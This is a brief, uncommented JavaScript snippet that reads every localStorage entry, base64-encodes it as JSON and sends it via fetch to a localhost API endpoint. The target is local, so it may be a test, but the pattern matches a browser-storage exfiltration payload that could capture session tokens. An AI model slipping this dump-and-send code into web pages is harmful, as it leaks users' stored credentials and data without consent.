const localStorageData = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  localStorageData[key] = value;  // Store key-value pairs
}
const jsonData = JSON.stringify(localStorageData);
const encodedData = btoa(jsonData);

const url = `http://localhost/api?data=${encodedData}`;

fetch(url)
  .then(response => response.json())
  .then(data => {
    console.log('Response from server:', data);
  })
  .catch(error => console.error('Error:', error));